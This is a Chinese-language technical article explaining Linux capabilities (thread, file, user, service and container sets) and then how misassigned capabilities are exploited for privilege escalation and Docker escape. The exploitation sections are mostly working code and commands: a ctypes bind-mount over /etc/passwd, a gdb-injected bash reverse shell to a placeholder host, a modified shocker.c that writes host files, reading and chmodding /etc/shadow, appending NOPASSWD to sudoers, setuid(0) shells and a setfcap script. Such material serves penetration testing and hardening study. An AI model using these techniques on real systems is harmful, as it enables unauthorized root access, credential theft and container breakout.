# Linux Capabilities利用总结
Linux对于权限的管理，系统权限只有root才有，对于普通用户只有一些有限的权限；而对于普通用户如果想进行一些权限以外的操作，之前主要有两种方法：一是通过sudo提权；二是通过SUID\[1\]，让普通用户对设有SUID的文件具有执行权限，当用户执行此文件时，会用文件的拥有者的权限执行，比如常用的命令`passwd`，修改用户的密码是需要root权限的，但是普通用户却可以使用，这是因为`/usr/bin/passwd`被设置了SUID，该文件的拥有者是root，所以普通用户可以使用并执行。然而SUID却带来了安全隐患，因为本身需要一部分特权，但是却拥有了root的全部权限，所以为了对root权限进行更加细粒度的控制，Linux 引入了 `capabilities` 机制对 root 权限进行细粒度的控制，实现按需授权，从而减小系统的安全攻击面。本文主要总结 Capabilites 机制的基本概念和利用。

从内核 2.2 开始，Linux 将传统上与超级用户 root 关联的特权划分为不同的单元，称为`Capabilites`。Capabilites 作为线程(Linux 并不真正区分进程和线程)的属性存在，每个单元可以独立启用和禁用。如此一来，权限检查的过程就变成了：在执行特权操作时，如果进程的有效身份不是 root，就去检查是否具有该特权操作所对应的 `capabilites`，并以此决定是否可以进行该特权操作。比如要向进程发送信号(kill())，就得具有 capability `CAP_KILL`；如果设置系统时间，就得具有 capability `CAP_SYS_TIME`。

Linux中的capability是可以分配给进程、二进制文件、服务和用户等的特殊属性，它们可以允许它们拥有通常保留给root级行动的特定权限，Capabilities 可以在进程执行时赋予，也可以直接从父进程继承。所以理论上如果给 nginx 可执行文件赋予了 `CAP_NET_BIND_SERVICE`，那么它就能以普通用户运行并监听在 80 端口上。

线程 Capabilities
---------------

每一个线程，具有5个`capabilities`集合，每一个集合使用 64 位掩码来表示，显示为 16 进制格式。五种 capabilities 集合类型，分别是：

*   • CapInh: Inheritable capabilities
    
*   • CapPrm: Permitted capabilities
    
*   • CapEff: Effective capabilities
    
*   • CapBnd: Bounding set
    
*   • CapAmb: Ambient capabilities set
    

每个集合中都包含零个或多个 capabilities。这5个集合的具体含义如下：

*   • `CapEff(Effective)`: Effective代表进程目前正在使用的所有Capabilities（这是内核用于权限检查的实际capabilities集）。对于文件capabilities来说，Effective实际上是一个单一的位，表示在运行二进制文件时，`Permitted`的Capabilities是否会被移到`Effective`集。这使得那些没有capabilities的二进制文件有可能在不发出特殊系统调用的情况下使用文件Capabilities。
    

*   • `CapPrm(Permitted)`: 这是一个capabilities的超集，线程可以将其添加到线程允许的或线程可继承的集合中。线程可以使用`capset()`系统调用来管理Capabilities。它可以从任何集合中删除任何Capabilities，但只能向其线程`Effective`和`Inheritable`添加线程允许集合中的Capabilities。因此，它不能将任何Capabilities添加到其线程允许的集合中，除非它的线程有效集合中有`CAP_SETPCAP`。
    

*   • `CapInh(Inheritable)`: 使用`Inheritable`集可以指定允许从父进程继承的所有Capabilities。这可以防止一个进程接收它不需要的任何Capabilities。这里需要说明一下，包含在该集合中的 capabilities 并不会自动继承给新的可执行文件，即不会添加到新线程的 `Effective` 集合中，它只会影响新线程的 `Permitted` 集合。
    

*   • `CapBnd(Bounding)`: `Bounding` 集合是 `Inheritable` 集合的超集，可以限制一个进程可能收到的Capabilities。在`Inheritable`和`Permitted`集中，只有存在于`Bounding`集中的Capabilities才被允许。
    

*   • `CapAmb(Ambient)`: Linux 4.3 内核新增了一个 capabilities 集合叫 `Ambient` ，用来弥补 `Inheritable` 的不足。`Ambient`集适用于所有没有文件Capabilities的非SUID二进制文件。它在`execve()`时保留了Capabilities。然而，并不是所有在Ambient集的Capabilities都会被保留，因为它们会被丢弃，以防它们不在`Inheritable`或`Permitted`集中出现。这个集合在 execve 调用时被保留。Ambient 的好处显而易见，举个例子，如果你将 `CAP_NET_ADMIN` 添加到当前进程的 Ambient 集合中，它便可以通过 `fork()` 和 `execve()` 调用 `shell` 脚本来执行网络管理任务，因为 `CAP_NET_ADMIN` 会自动继承下去。
    

要查看某个特定进程的capabilities，可以使用`/proc`目录下的状态文件。

> 对于所有正在运行的进程，capabilities信息是按线程维护的，对于文件系统中的二进制文件，它被存储在扩展属性中。

可以在`/usr/include/linux/capability.h`中找到定义的Capabilities。可以在`cat /proc/self/status`或`capsh --print`中找到当前进程的capabilities，在`/proc/<pid>/status`中找到其他用户的capabilities。

```
cat /proc/<pid>/status | grep Cap

# 查看当前进程的capabilities  
cat /proc/$$/status | grep Cap


```

这是一个典型的`root`进程所拥有的capabilities。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/d6f4fb93-777a-446c-8352-e469be3c59be.png?raw=true)

  

*   • `capsh`
    

但是这种方式获得的信息无法阅读，我们需要使用 `capsh` 命令把它们转义为可读的格式：

```
capsh --decode=0000003fffffffff
```

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/cd30d153-3ed2-40fd-83d5-4f6187c00008.png?raw=true)

  

capsh也可以直接查看当前capabilities`capsh --print` 。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/719e7308-7e50-42b1-973c-3111e7374ced.png?raw=true)

  

*   • `getpcaps`
    

getpcaps工具使用`capget()`系统调用来查询某个特定线程的可用Capabilities。这个系统调用只需要提供PID就可以获得相关信息。查看进程的capabilities还可以通过`getpcaps`，然后是其进程ID（PID），也可以提供一个进程ID的列表。

```
getpcaps <pid>
```

测试一下`tcpdump`的Capabilities，在赋予二进制文件足够的Capabilities（`cap_net_admin`和`cap_net_raw`）来抓包后（ping在395120进程中运行）。可以看到我们给tcpdump设置的capabilities是一致的，非root用户也可以嗅探网络。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/47d84d66-bac4-446e-a849-be1c6fb17886.png?raw=true)

  

文件 Capabilities
---------------

文件的 capabilities 被保存在文件的扩展属性中。如果想修改这些属性，需要具有 `CAP_SETFCAP` 的 capability。文件与线程的 capabilities 共同决定了通过 `execve()` 运行该文件后的线程的 capabilities。

文件的 capabilities 功能，需要文件系统的支持。如果文件系统使用了 `nouuid` 选项进行挂载，那么文件的 capabilities 将会被忽略。

在上面的示例中我们通过 `setcap` 命令修改了程序文件 `/usr/sbin/tcpdump` 的 capabilities。在可执行文件的属性中有三个集合来保存三类 capabilities，它们分别是：

*   • `Permitted`：在进程执行时，Permitted 集合中的 capabilites 自动被加入到进程的 Permitted 集合中。
    
*   • `Inheritable`：Inheritable 集合中的 capabilites 会与进程的 Inheritable 集合执行与操作，以确定进程在执行 execve 函数后哪些 capabilites 被继承。
    
*   • `Effective`：Effective 只是一个 bit。如果设置为开启，那么在执行 execve 函数后，Permitted 集合中新增的 capabilities 会自动出现在进程的 Effective 集合中。
    

二进制文件可以有在执行时可以使用的Capabilities。例如，有`cap_net_raw`capabilites的ping二进制文件，以及设置过的tcpdump。

```
root@k8s-master:~# getcap /usr/bin/ping  
/usr/bin/ping = cap_net_raw+ep  
root@k8s-master:~# getcap /usr/sbin/tcpdump  
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

命令中的 ep 分别表示 Effective 和 Permitted 集合，+ 号表示把指定的 capabilities 添加到这些集合中，- 号表示从集合中移除(对于 Effective 来说是设置或者清除位)。

下面的命令可以用来查找已经有capabilities的二进制文件。

```
getcap -r / 2>/dev/null
```

*   • **通过capsh删除Capabilities**
    

如果我们停止`tcpdump`的`CAP_NET_RAW`那么无法再使用。

```
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/1333a9a4-d54a-4c0c-b76d-4a0a800b2f78.png?raw=true)

  

*   • **移除Capabilities**
    

可以用以下方法移除一个二进制文件的Capabilities。

```
setcap -r <path>
```

用户 Capabilities
---------------

用户也可以分配Capabilities，这意味着，由用户执行的每一个进程都能使用用户的capabilities。

分配给用户的Capabilities存储在`/etc/security/capability.conf`配置文件中。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/dbe2de0b-a70e-4ac7-9294-ff82430a78b3.png?raw=true)

  

环境 Capabilities
---------------

可以通过`capsh --print`查看当前环境的Capabilities 编译ambient.c\[2\]程序，就有可能在一个提供 Capabilities 的环境中产生一个`bash shell` 在运行编译后的文件后获得的`bash`中可以发现有了新的Capabilities。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/d9fb7a6d-d659-4cf3-8d60-a87cc2f36cde.png?raw=true)

  

> 只能添加同时存在于CapPrm(Permitted)和CapInh(Inheritable)集合中的Capabilities。

具有Capabilities意识的二进制文件不会使用环境赋予的新Capabilities，但是capability低的二进制文件会使用它们，因为它们不会拒绝这些Capabilities。这使得在向二进制文件授予Capabilities的特殊环境中，capability低的二进制文件容易受到攻击。

服务 Capabilities
---------------

默认情况下，以root身份运行的服务将具有所有的capabilities，这是相当危险的。

因此，服务的配置文件允许指定希望它拥有的Capabilities，以及应该执行服务的用户，以避免以不必要的权限运行服务。 `systemd`通过`AmbientCapabilities`变量为服务提供了配置Capabilities的指令。

```
[Service]  
User=test  
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/bb3fcc3b-f49d-4838-bee6-2c55635844fc.png?raw=true)

  

容器 Capabilities
---------------

Docker容器不同于虚拟机，它共享宿主机操作系统内核。宿主机和容器之间通过内核命名空间（namespaces）、内核Capabilities、CGroups（control groups）等技术进行隔离。

在大部分情况下，容器里的进程不需要以root用户运行，Docker给容器内root只授予了几个默认的Capabilities\[3\]，其他的禁用。这意味着容器里的root用户权限比宿主机上真正的root用户权限要小。

实际情况用户会存在自己给容器添加特权方便操作，比如额外添加一些Capability，例如SYS_ADMIN，以及运行具有`--privileged`或危险功能的 Docker 容器允许特权操作。

> privileged标志给了容器所有的Capabilities，而且它还解除了设备cgroup控制器强制执行的所有限制，容器可以访问主机所有device以及具有mount操作的权限。但是--privileged参数不等于只是拥有所有的Capabilities，还包括禁用Seccomp和AppArmor等安全机制、访问device。换句话说，容器可以做主机可以做的几乎所有事情。

当容器拥有特权后是可以逃逸到宿主机的，所以为了方便默认情况下Docker为容器启用了一些Capabilities，并且Kubernetes也可以给容器配置Capabilities\[4\]。

容器内如果有命令`capsh`可以通过`capsh --print`查看当前的Capabilities 识别错误配置的Capabilities的最简单方法是使用枚举脚本，如LinPEAS\[5\]  。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/bd9c6ae7-e71e-4eaa-8efe-b9f602c4772a.png?raw=true)

  

特殊情况 空Capabilities
------------------

可以给文件设置空的capability，这样或许会创建一个`set-user-ID-root`的程序，这将执行该程序的进程`effective`保存的`set-user-ID`改为0。如果有一个文件符合下面的条件：

1.  1. 不属于root。
    
2.  2. `SUID/SGID`位没有设置。
    
3.  3. capabilities设置为空。
    

该文件将以root运行。

```
# 比如如下情况  
$ getcap <filename>  
<filename> =ep
```

对tcpdump测试。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/43bbcf2e-cdf0-4a81-970b-cf22857ec09e.png?raw=true)

  

经过设置后普通用户也可以执行tcpdump。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/2203ce99-0eab-4171-825c-f2da9eb8e09c.png?raw=true)

  

以下是一些常见的 Capabilites 列表：

| Capability 名称 | 描述 |
| --- | --- |
| CAP_CHOWN | 修改文件所有者的权限 |
| CAP\_DAC\_OVERRIDE | 忽略文件的 DAC 访问限制 |
| CAP\_DAC\_READ_SEARCH | 忽略文件读及目录搜索的 DAC 访问限制 |
| CAP_FOWNER | 忽略文件属主 ID 必须和进程用户 ID 相匹配的限制 |
| CAP_FSETID | 允许设置文件的 setuid 位 |
| CAP_KILL | 允许对不属于自己的进程发送信号 |
| CAP\_LINUX\_IMMUTABLE | 允许修改文件的 IMMUTABLE 和 APPEND 属性标志 |
| CAP\_NET\_ADMIN | 允许执行网络管理任务 |
| CAP\_NET\_BIND_SERVICE | 允许绑定到小于 1024 的端口 |
| CAP\_NET\_RAW | 允许使用原始套接字 |
| CAP_SETGID | 允许改变进程的 GID |
| CAP_SETFCAP | 允许为文件设置任意的 capabilities |
| CAP_SETUID | 允许改变进程的 UID |
| CAP\_SYS\_ADMIN | 允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等 |
| CAP\_SYS\_BOOT | 允许重新启动系统 |
| CAP\_SYS\_CHROOT | 允许使用 chroot() 系统调用 |
| CAP\_SYS\_MODULE | 允许插入和删除内核模块 |
| CAP\_SYS\_PTRACE | 允许跟踪任何进程 |
| CAP\_SYS\_RAWIO | 允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备 |
| CAP_SYSLOG | 允许使用 syslog() 系统调用 |

利用情况主要从两个方面考虑：

*   • 当二进制文件具有Capabilities。
    
*   • 环境具有Capabilities主要是当前在容器内。
    

Capabilities信息收集

*   • 二进制文件
    

```
# 查找/下的所有具有Capabilities的二进制文件  
getcap -r / 2>/dev/null

# 查看单个二进制文件  
getcap <path>


```

*   • 环境容器内
    

`capsh --print`

### 以下主要列举利用意义大的一些Capabilities

CAP\_SYS\_ADMIN
---------------

**CAP\_SYS\_ADMIN:** 允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等 CAP\_SYS\_ADMIN在很大程度上是一种全面的Capabilities，它很容易导致额外的Capabilities或完全的root（通常是对所有Capabilities的访问）。CAP\_SYS\_ADMIN需要执行一系列的管理操作，如果在容器内执行特权操作，就很难从容器中删除。对于模仿整个系统的容器来说，保留这种Capabilities往往是必要的，而对于单独的应用程序容器来说，它的限制性更强。

**当文件具有能力：**  通过收集发现python具有该能力。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/ba664986-ce53-4056-94e1-84f96e774de5.png?raw=true)

  

通过python可以修改root的密码。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/24a2f311-22e0-4b11-96ce-ecd6cf649fbb.png?raw=true)

  

通过脚本将修改过的passwd文件`mount`到`/etc/passwd` 。

```
from ctypes import *  
libc = CDLL("libc.so.6")  
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)  
MS_BIND = 4096  
source = b"<fake passwd 路径>"  
target = b"/etc/passwd"  
filesystemtype = b"none"  
options = b"rw"  
mountflags = MS_BIND  
libc.mount(source, target, filesystemtype, mountflags, options)
```

成功root密码password登陆。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/5715b4d2-313d-439b-ade4-4705225b293c.png?raw=true)

  

**当环境具有能力：**  主要为当前可能是一个容器，通过信息收集发现当前环境具有`SYS_ADMIN`。

*   • 挂载主机
    

可以在容器内挂载宿主机磁盘。

```
fdisk -l  
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors  
Units: sectors of 1 * 512 = 512 bytes  
Sector size (logical/physical): 512 bytes / 512 bytes  
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/  
cd /mnt  
chroot ./ bash


```

*   • 通过ssh
    

通过挂载，之后创建一个用户，在使用该用户ssh连接。

```
#Like in the example before, the first step is to moun the dosker host disk  
fdisk -l  
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host  
nc -v -n -w2 -z 172.17.0.1 1-65535  
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH  
chroot /mnt/ adduser john  
ssh john@172.17.0.1 -p 2222


```

除此之外还可以通过`notify_on_release`进行逃逸参考理解Docker容器转义\[6\] 。

CAP\_SYS\_MODULE
----------------

**CAP\_SYS\_MODULE:** 允许插入和删除内核模块 CAP\_SYS\_MODULE允许进程加载和卸载任意的内核模块（init\_module(2), finit\_module(2) 和 delete_module(2) 系统调用）。这可能导致微不足道的权限升级和ring-0妥协。内核可以被随意修改，颠覆所有系统安全、Linux安全模块和容器系统。

**当文件具有能力(内核编译参考环境部分)：** 

*   • python：可以利用python加载内核模块。
    
*   • kmod：可以利用该命令插入内核模块。
    

**当环境具有能力：** 

*   • 容器：创建内核模块，通过nc接收反弹的shell可以参考Docker容器突破:滥用SYS MODULE能力\[7\]和破解 Play-with-Docker 并在主机上远程运行代码\[8\]  。
    

当python具有该能力 默认情况下，`modprobe`命令检查目录中的依赖列表和映射文件`/lib/modules/$(uname -r)` 为了利用创建一个假的`lib/modules`文件夹。

```
mkdir lib/modules -p  
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

CAP\_SYS\_PTRACE
----------------

**CAP\_SYS\_PTRACE：** 允许跟踪任何进程 `CAP_SYS_PTRACE` 允许使用 ptrace(2) 和最近引入的跨内存附加系统调用，如 process\_vm\_readv(2) 和 process\_vm\_writev(2) 。如果这个Capabilities被授予，并且 ptrace(2) 系统调用本身没有被 seccomp 过滤器阻止，这将允许攻击者绕过其他 seccomp 限制，请参考 PoC 在允许 ptrace 时绕过 seccomp\[9\]。

**当文件具有能力：** 比如python时还可以参考python Capabilities cap\_sys\_ptrace+ep提权\[10\]  。

**当环境具有能力：** 比如在docker内时，可以通过Shellcode注入\[11\]；或者当前环境具有`gdb`，可以从主机`debug`进程中调用`system`函数。

```
gdb -p 1234  
(gdb) call (void)system("ls")  
(gdb) call (void)system("sleep 5")  
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'")
```

CAP\_DAC\_READ_SEARCH
---------------------

**CAP\_DAC\_READ_SEARCH：** 忽略文件读及目录搜索的 DAC 访问限制。

CAP\_DAC\_READ_SEARCH 允许一个进程绕过文件读取和目录读取及执行的权限。虽然这被设计为用于搜索或读取文件，但它也授予进程调用`open_by_handle_at(2)`的权限。任何具有`CAP_DAC_READ_SEARCH`Capabilities的进程都可以使用`open_by_handle_at(2)`来获得对任何文件的访问，甚至是挂载命名空间之外的文件。传递给 `open_by_handle_at(2)` 的句柄被认为是使用 `name_to_handle_at(2)` 获取的不透明标识符。然而，这个句柄包含了敏感和可篡改的信息，如inode号码。这是Sebastian Krahmer用shocker\[12\]漏洞首次在Docker容器中显示的问题。

**当文件具有能力：** 

*   • **tar**
    

在根目录递归检测cap时发现tar具有`cap_dac_read_search`功能。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/6c902fbc-c0a8-43c7-af80-392712e77c03.png?raw=true)

  

当任何程序拥有cap\_dac\_read_searchCapabilities的有效集合时，这意味着它可以读取任何文件或对目录执行任何可执行的权限。该程序不能在目录中创建任何文件或修改现有文件，因为它需要写入权限，而这种Capabilities没有提供这种权限。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/13dae0e4-4768-4c17-b908-cffb75964ab3.png?raw=true)

  

> 因为在这种情况下，tar有这个权限。你不能目录升级权限，但如果你幸运的话，在取回影子文件后破解哈希密码。你可以通过包括/etc/shadow文件来执行一个简单的tar归档，然后再提取它。

当前可以利用tar具有的能力，将相关敏感文件打个包，然后再拿出来。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/49821b23-a36e-483c-a83a-e615fbb75905.png?raw=true)

  

*   • python
    

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/3a5eae3a-514a-4ec8-947b-693b758f68ce.png?raw=true)

  

利用python列出`/root`下的所有文件：

```
import os  
for r, d, f in os.walk('/root'):  
    for filename in f:  
        print(filename)
```

也可以读取指定文件如`/etc/shadow` 。

```
python -c 'print(open("/etc/shadow", "r").read())'
```

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/5d8075d5-a90b-4c7f-b853-e39edf8052d0.png?raw=true)

  

**当环境具有能力：**  参考该文章利用shocker.c，利用需要找到一个指向安装在主机上的东西的指针，文章使用`/.dockerinit`也可以修改为`/etc/hostname`该文件必须是挂载的主机中的文件，比如k8s中`kube-proxy`就将`/etc/hostname`该文件挂载。

> Docker已经通过放弃CAP\_DAC\_READ\_SEARCH（以及使用seccomp阻止对open\_by\_handle\_at的访问）来缓解这个问题。

CAP\_DAC\_OVERRIDE
------------------

**CAP\_DAC\_OVERRIDE:** 忽略文件的 DAC 访问限制，可以写入任何文件 可以用来写文件，比如vim有该能力，可以修改sudo配置文件提权。

**当文件具有能力：** 

*   • **vim**
    

当vim具有该能力，可以修改如passwd 、sudoers或shadow等。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/3bb94402-69ec-47d1-9811-c210e28e12a8.png?raw=true)

  

修改相关文件进行利用。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/7ce21b8e-28e4-4ada-b713-0e578475008e.png?raw=true)

  

*   • **python**
    

当python具有该能力，同样可以修改一些敏感文件提权。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/8812c29f-79e7-4511-9984-b30100e11a06.png?raw=true)

  

```
file=open("/etc/sudoers","a")  
file.write("username ALL=(ALL) NOPASSWD:ALL")  
file.close()
```

**当环境具有能力：**  想要逃逸还需要具有能力`CAP_DAC_READ_SEARCH`可以读取主机文件，对`shocker.c`进行修改，改为对主机写入任意文件。

```
#include <stdio.h>  
#include <sys/types.h>  
#include <sys/stat.h>  
#include <fcntl.h>  
#include <errno.h>  
#include <stdlib.h>  
#include <string.h>  
#include <unistd.h>  
#include <dirent.h>  
#include <stdint.h>

// gcc shocker_write.c -o shocker_write  
// ./shocker_write /etc/passwd passwd 

struct my_file_handle {  
  unsigned int handle_bytes;  
  int handle_type;  
  unsigned char f_handle[8];  
};  
void die(const char * msg) {  
  perror(msg);  
  exit(errno);  
}  
void dump_handle(const struct my_file_handle * h) {  
  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,  
    h -> handle_type);  
  for (int i = 0; i < h -> handle_bytes; ++i) {  
    fprintf(stderr, "0x%02x", h -> f_handle[i]);  
    if ((i + 1) % 20 == 0)  
      fprintf(stderr, "\n");  
    if (i < h -> handle_bytes - 1)  
      fprintf(stderr, ", ");  
  }  
  fprintf(stderr, "};\n");  
}   
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)  
{  
  int fd;  
  uint32_t ino = 0;  
  struct my_file_handle outh = {  
    .handle_bytes = 8,  
    .handle_type = 1  
  };  
  DIR * dir = NULL;  
  struct dirent * de = NULL;  
  path = strchr(path, '/');  
  // recursion stops if path has been resolved  
  if (!path) {  
    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));  
    oh -> handle_type = 1;  
    oh -> handle_bytes = 8;  
    return 1;  
  }  
  ++path;  
  fprintf(stderr, "[*] Resolving '%s'\n", path);  
  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)  
    die("[-] open_by_handle_at");  
  if ((dir = fdopendir(fd)) == NULL)  
    die("[-] fdopendir");  
  for (;;) {  
    de = readdir(dir);  
    if (!de)  
      break;  
    fprintf(stderr, "[*] Found %s\n", de -> d_name);  
    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {  
      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);  
      ino = de -> d_ino;  
      break;  
    }  
  }  
  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");  
  if (de) {  
    for (uint32_t i = 0; i < 0xffffffff; ++i) {  
      outh.handle_bytes = 8;  
      outh.handle_type = 1;  
      memcpy(outh.f_handle, & ino, sizeof(ino));  
      memcpy(outh.f_handle + 4, & i, sizeof(i));  
      if ((i % (1 << 20)) == 0)  
        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);  
      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {  
        closedir(dir);  
        close(fd);  
        dump_handle( & outh);  
        return find_handle(bfd, path, & outh, oh);  
      }  
    }  
  }  
  closedir(dir);  
  close(fd);  
  return 0;  
}  
int main(int argc, char * argv[]) {  
  char buf[0x1000];  
  int fd1, fd2;  
  struct my_file_handle h;  
  struct my_file_handle root_h = {  
    .handle_bytes = 8,  
    .handle_type = 1,  
    .f_handle = {  
      0x02,  
      0,  
      0,  
      0,  
      0,  
      0,  
      0,  
      0  
    }  
  };  
  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"  
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"  
    "[***] If you have pending sec consulting, I'll happily [***]\n"  
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");  
  read(0, buf, 1);  
  // get a FS reference from something mounted in from outside  
  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)  
    die("[-] open");  
  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)  
    die("[-] Cannot find valid handle!");  
  fprintf(stderr, "[!] Got a final handle!\n");  
  dump_handle( & h);  
  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)  
    die("[-] open_by_handle");  
  char * line = NULL;  
  size_t len = 0;  
  FILE * fptr;  
  ssize_t read;  
  fptr = fopen(argv[2], "r");  
  while ((read = getline( & line, & len, fptr)) != -1) {  
    write(fd2, line, read);  
  }  
  printf("Success!!\n");  
  close(fd2);  
  close(fd1);  
  return 0;  
}


```

CAP_CHOWN
---------

**CAP_CHOWN:** 可以改变任何文件的所有权。

**当文件具有能力：**  假设python二进制文件具有这种能力，可以改变`/etc/shadow`的所有者，改变root的密码以此提权。python具有CAP_CHOWN，当前`/etc/shadow`还是root的。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/6afe5af3-b2ef-4a28-809c-cf41b6a08eea.png?raw=true)

  

通过利用python所有者已经变更。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/1273e384-0c24-4c29-bde5-64380e460a27.png?raw=true)

  

或者ruby可以通过如下命令。

```
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

CAP_FOWNER
----------

**CAP_FOWNER：** 更改任何文件的权限 类似CAP_CHOWN，python具有这种能力，可以改变`/etc/shadow`的所有者，改变root的密码以此提权。

```
python -c 'import os;os.chmod("/etc/shadow",0666)'
```

CAP_SETUID
----------

**CAP_SETUID：** 允许设置所创建进程的有效用户ID。

**当文件具有能力：**  具有该能力，可以设置uid为0后，调用bash达到提权。

*   • python
    
*   • perl
    
*   • tar
    

比如利用python：

```
# 方法一  
import os  
os.setuid(0)  
os.system("/bin/bash")  
python3.8 -c 'import os;os.setuid(0);os.system("/bin/bash")'

# 方法二  
import os  
import prctl  
# 在集合effective中添加capability  
prctl.cap_effective.setuid = True  
os.setuid(0)  
os.system("/bin/bash")


```

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/989627c8-cadc-459f-a2e0-4604c7f36cef.png?raw=true)

  

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/7f5e213d-8e9b-4c99-aebb-c9eb27d38cc3.png?raw=true)

  

CAP_SETGID
----------

**CAP_SETGID：** 允许设置所创建进程的有效组ID。

**当文件具有能力：**  可以通过覆盖文件来提权，找到组可以操作的文件，因为可以设置为任何组。

```
# 查找组可写的每个文件  
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null  
# 在/etc中找到每一个maxpath为1的组可写文件  
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null  
# 在/etc中查找每一个maxpath为1的组可读文件  
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

找到一个文件，就可以滥用（通过读或写）升级权限，得到一个shell。

```
import os  
os.setgid(42)  
os.system("/bin/bash")
```

shadow的组id为42，可以通过python创建一个shell。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/f3177e28-a142-4642-a511-5dc0e1cbd96f.png?raw=true)

  

创建的进程被设置组id为shadow，可以`cat /etc/shadow` 。

![](https://github.com/D0n9/paper_archive/blob/main/paper/picture/2023/1/154bae14-39b3-47d9-b27b-19ff7aa346c5.png?raw=true)

  

主要可以进行如下操作：

*   • 将用户和密码添加到/etc/passwd。
    
*   • 在/etc/shadow中更改密码。
    
*   • 在/etc/sudoers中将用户添加到sudoers。
    
*   • 通过docker套接字通信利用docker，一般在`/run/docker.sock`或`/var/run/docker.sock` 。
    

CAP_SETFCAP
-----------

**CAP_SETFCAP：** 可以给文件和进程设置能力。 

**当文件具有能力：**  当python具有该能力可以通过脚本提权到root`python3.8 setfcap.py /usr/bin/python3.8` 。

```
import ctypes, sys

#Load needed library  
#You can find which library you need to load checking the libraries of local setcap binary  
# ldd /sbin/setcap  
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]  
libcap.cap_from_text.restype = ctypes.c_void_p  
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary  
cap = 'cap_setuid+ep'  
path = sys.argv[1]  
print(path)  
cap_t = libcap.cap_from_text(cap)  
status = libcap.cap_set_file(path,cap_t)

if(status == 0):  
    print (cap + " was successfully added to " + path)


```

通过给python添加新能力，新能力将直接覆盖原本的能力，如果想保留可以通过在原有的基础上添加比如`cap_setuid,cap_setfcap+ep` 。

**当环境具有能力：**  该能力是默认添加给docker进程的能力，该能力允许给其他二进制的文件添加能力，所以可以给其他二进制文件添加可以用来逃逸的能力。

*   • https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work
    
*   • https://www.trendmicro.com/en_us/research/19/l/why-running-a-privileged-container-in-docker-is-a-bad-idea.html
    
*   • https://blog.ploetzli.ch/2014/understanding-linux-capabilities/
    
*   • https://man7.org/linux/man-pages/man7/capabilities.7.html
    
*   • https://s3hh.wordpress.com/2015/07/25/ambient-capabilities/
    
*   • https://pierrchen.blogspot.com/2018/05/container-deep-dive-3-linux-capabilities.html
    
*   • https://www.onitroad.com/jc/linux/man-pages/linux/man7/capabilities.7.html
    

#### 引用链接

`[1]` SUID: _https://en.wikipedia.org/wiki/Setuid_  
